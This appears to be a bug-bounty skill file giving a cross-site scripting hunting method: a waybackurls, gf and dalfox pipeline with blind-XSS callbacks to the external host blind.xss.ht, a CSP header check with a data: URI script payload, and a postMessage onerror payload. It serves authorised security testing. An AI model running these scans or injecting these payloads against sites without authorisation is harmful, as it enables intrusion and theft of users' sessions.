---
name: attack-xss
description: "Cross-site scripting — Dalfox automation, Wayback GF, CSP bypass, and postMessage XSS"
category: "client-side"
version: "1.0"
author: "bountyreper-official"
tags:
  - xss
  - csp
  - dalfox
  - postmessage
tech_stack:
  - web
cwe_ids:
  - CWE-79
chains_with:
  - attack-account-takeover
  - attack-html-injection
prerequisites: []
---

# XSS Hunting

## Objective

Find reflected, stored, and DOM XSS via automation and CSP/postMessage bypass.

> **Attribution:** Methodology from [KathanP19/HowToHunt — XSS](https://github.com/KathanP19/HowToHunt/tree/master/XSS) (5 files: Automated_XSS, Bypass_CSP, post_message, XSS_Bypass). Licensed GPL-3.0.

## Testing Methodology

### Automation (Dalfox + Wayback + GF)

```bash
waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u > possible.txt
cat possible.txt | dalfox pipe --skip-bav -b blind.xss.ht
# Blind XSS
waybackurls target.com | gf xss | dalfox -b blind.xss.ht pipe
```

### CSP Bypass

```bash
# Check CSP header
curl -s -D- https://target.com | grep -i content-security-policy
# If unsafe-inline or data: allowed, XSS possible
# Test with: <script src=data:text/javascript,alert(1)>
```

### postMessage XSS

```js
// In browser console, test postMessage listener
window.addEventListener('message', e => console.log(e.data))
// Fuzz with: window.postMessage("<img src=x onerror=alert(1)>", "*")
```

## References

- [HowToHunt — XSS](https://github.com/KathanP19/HowToHunt/tree/master/XSS)
